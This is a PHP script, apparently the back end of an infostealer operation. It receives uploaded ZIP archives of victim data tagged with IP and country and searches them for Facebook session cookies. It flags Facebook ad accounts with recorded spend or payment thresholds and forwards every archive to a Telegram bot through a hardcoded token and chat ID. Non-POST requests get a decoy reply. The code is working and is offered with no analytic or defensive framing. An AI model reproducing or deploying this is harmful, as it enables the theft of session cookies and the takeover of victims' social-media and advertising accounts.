<?php
$uploadDir = __DIR__ . '/facebook/';
$logFilePath = __DIR__ . '/log_receivefb.txt';
$failedDir = __DIR__ . '/NoFBCookies/';
$telegramToken = '7941390822:AAHnc5-BvEfhT6MWf0B4vKugvkivPaWQq8c';
$telegramChatId = '6871070750';

// Ghi log vào file
function writeLog($message, $logFile) {
    file_put_contents($logFile, date('Y-m-d H:i:s') . " - " . $message . PHP_EOL, FILE_APPEND);
}

// Tạo thư mục lưu trữ file nếu chưa tồn tại
if (!is_dir($uploadDir)) {
    mkdir($uploadDir, 0777, true);
    writeLog("Created directory: $uploadDir", $logFilePath);
}

// Kiểm tra yêu cầu upload file, nếu là GET hoặc không hợp lệ trả về JSON với "Hello buddy !"
if ($_SERVER['REQUEST_METHOD'] !== 'POST' || !isset($_FILES['file'])) {
    echo json_encode([
        'status' => 'error',
        'message' => 'Hello buddy !'
    ]);
    exit();
}

// Tiếp tục xử lý yêu cầu POST nếu hợp lệ
$file = $_FILES['file'];
writeLog("Received a file upload request.", $logFilePath);

if ($file['error'] === UPLOAD_ERR_OK) {
    $fileTmpPath = $file['tmp_name'];
    $fileName = basename($file['name']);
    $destPath = $uploadDir . uniqid() . '-' . $fileName;

    writeLog("Attempting to move file to: $destPath", $logFilePath);

    if (move_uploaded_file($fileTmpPath, $destPath)) {
        writeLog("File successfully moved to: $destPath", $logFilePath);

        // Trích xuất thông tin IP và quốc gia từ tên file
        $ip = "Unknown";
        $country = "Unknown";
        if (preg_match('/\[(.*?)\]/', $fileName, $matches)) {
            $ipCountry = explode('_', $matches[1]);
            if (count($ipCountry) == 2) {
                $country = $ipCountry[0];
                $ip = $ipCountry[1];
            }
        }

        $zip = new ZipArchive();
        $messageContent = "IP: $ip\nCountry: $country";

        if ($zip->open($destPath) === TRUE) {
            $hasFacebookCookies = false;
            $cookieFilePath = '';
            $extractPath = $uploadDir . 'temp/' . uniqid() . '/';
            mkdir($extractPath, 0777, true);

            // Tìm kiếm file Facebook_Cookies.txt trong file zip
            for ($i = 0; $i < $zip->numFiles; $i++) {
                $fileNameInZip = $zip->getNameIndex($i);
                if (preg_match('/Facebook_Cookies\.txt$/', $fileNameInZip)) {
                    $hasFacebookCookies = true;
                    $zip->extractTo($extractPath, $fileNameInZip);
                    $cookieFilePath = $extractPath . $fileNameInZip;
                    writeLog("Found Facebook_Cookies.txt at: $fileNameInZip", $logFilePath);
                    break;
                }
            }
            $zip->close();

            // Xử lý file Facebook_Cookies.txt nếu tìm thấy
            if ($hasFacebookCookies && file_exists($cookieFilePath)) {
                $cookieContent = processFacebookCookies($cookieFilePath);

                if ($cookieContent !== false) {
                    $messageContent .= "\n Co TKQC";
                }
            } else {
                writeLog("Facebook_Cookies.txt not found or unable to process. Proceeding to send file.", $logFilePath);
                $messageContent .= "\n No Facebook_Cookies.txt";

                // Tạo thư mục NoFBCookies nếu cần
                if (!is_dir($failedDir)) {
                    mkdir($failedDir, 0777, true);
                    writeLog("Created NoFBCookies directory: $failedDir", $logFilePath);
                }
                // Sao chép file vào thư mục NoFBCookies
                $newFilePath = $failedDir . basename($destPath);
                if (copy($destPath, $newFilePath)) {
                    writeLog("File copied to NoFBCookies directory: $newFilePath", $logFilePath);
                } else {
                    writeLog("Failed to copy file to NoFBCookies directory.", $logFilePath);
                }
            }

            sendToTelegram($destPath, $telegramToken, $telegramChatId, $messageContent);

            echo json_encode([
                'status' => 'success',
                'message' => 'File uploaded successfully',
                'file_path' => $destPath
            ]);
        } else {
            writeLog("Failed to open ZIP file: $destPath", $logFilePath);
            echo json_encode([
                'status' => 'error',
                'message' => 'Failed to open ZIP file'
            ]);
        }
    } else {
        writeLog("Failed to move uploaded file.", $logFilePath);
        echo json_encode([
            'status' => 'error',
            'message' => 'Failed to move uploaded file'
        ]);
    }
} else {
    writeLog("File upload error: " . $file['error'], $logFilePath);
    echo json_encode([
        'status' => 'error',
        'message' => 'File upload error',
        'error_code' => $file['error']
    ]);
}

function sendToTelegram($filePath, $token, $chatId, $caption) {
    $url = "https://api.telegram.org/bot$token/sendDocument";
    $maxRetries = 20;  // Số lần thử tối đa
    $retryCount = 0;   // Biến đếm số lần thử
    $delayBetweenRetries = 5; // Thời gian nghỉ giữa các lần thử (giây)
    $sentSuccessfully = false; // Cờ đánh dấu gửi thành công

    while ($retryCount < $maxRetries) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, [
            'chat_id' => $chatId,
            'document' => new CURLFile($filePath),
            'caption' => $caption
        ]);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);

        if ($httpCode == 200) {
            writeLog("File sent to Telegram successfully.", $GLOBALS['logFilePath']);
            $sentSuccessfully = true;
            break;  // Gửi thành công, thoát khỏi vòng lặp
        } else {
            writeLog("Failed to send file to Telegram. Response: " . $response, $GLOBALS['logFilePath']);
            $retryCount++;  // Tăng số lần thử
            if ($retryCount < $maxRetries) {
                sleep($delayBetweenRetries);  // Nghỉ 5 giây trước khi thử lại
            }
        }
    }

    // Nếu sau 20 lần vẫn không gửi được, ghi log vào failed.txt
    if (!$sentSuccessfully) {
        $dateTime = date('Y-m-d H:i:s');
        $failedMessage = "File name: $filePath không gửi được tới Telegram vào $dateTime\n";
        file_put_contents(__DIR__ . '/failed.txt', $failedMessage, FILE_APPEND);
        writeLog("Failed to send file to Telegram after $retryCount attempts. Logged in failed.txt.", $GLOBALS['logFilePath']);
    }
}

function processFacebookCookies($filePath) {
    $handle = fopen($filePath, 'r');
    if ($handle) {
        while (($line = fgets($handle)) !== false) {
            if (preg_match('/Tổng Đã Chi Tiêu: ([0-9,.]+) (USD|COP)/', $line, $matches)) {
                $totalSpent = floatval(str_replace(',', '', $matches[1]));
                if ($totalSpent > 0) {
                    fclose($handle);
                    return trim($line);
                }
            }

            if (preg_match('/Ngưỡng: ([0-9,.]+) (USD|COP)/', $line, $matches)) {
                $threshold = floatval(str_replace(',', '', $matches[1]));
                if ($threshold > 0) {
                    fclose($handle);
                    return trim($line);
                }
            }
        }
        fclose($handle);
    }

    return false;
}
?>
